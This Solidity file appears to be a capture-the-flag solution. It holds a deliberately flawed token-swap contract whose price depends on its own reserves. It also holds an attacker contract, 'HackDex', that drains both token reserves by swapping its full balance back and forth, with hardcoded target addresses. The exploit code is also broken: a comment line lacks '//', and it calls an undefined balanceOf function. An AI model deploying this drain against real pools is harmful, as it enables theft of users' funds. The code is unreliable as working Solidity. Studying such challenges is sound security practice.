// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

contract HackDex {
    Dex public constant dex = Dex(0x726c75AB3059D83c59C719fcB15cC57Fb65B683e);
    address public constant tokenA = 0x02471d12B078Da19e42cc8b71E6aa886c4C7a5f0;
    address public constant tokenB = 0x2cEF912AeAbC6225d068D4F0760A106147d4781e;

    function drain() public {
        // initiate swap all a to b
        dex.swap(tokenA, tokenB, balanceOf(tokenA, address(this)));
        
        check if a or b balance of dex contract is 0
        while(dex.balanceOf(tokenA, dex) != 0 || dex.balanceOf(tokenB, dex) != 0) {
            if (dex.balanceOf(tokenA, address(this)) == 0) {
                dex.swap(tokenB, tokenA, balanceOf(tokenB, address(this)));
            } else {
                dex.swap(tokenA, tokenB, balanceOf(tokenA, address(this)));
            }
        }
    }

    // approve all
    function callApprove() public {
        dex.approve(dex, 2**256 - 1);
    }
}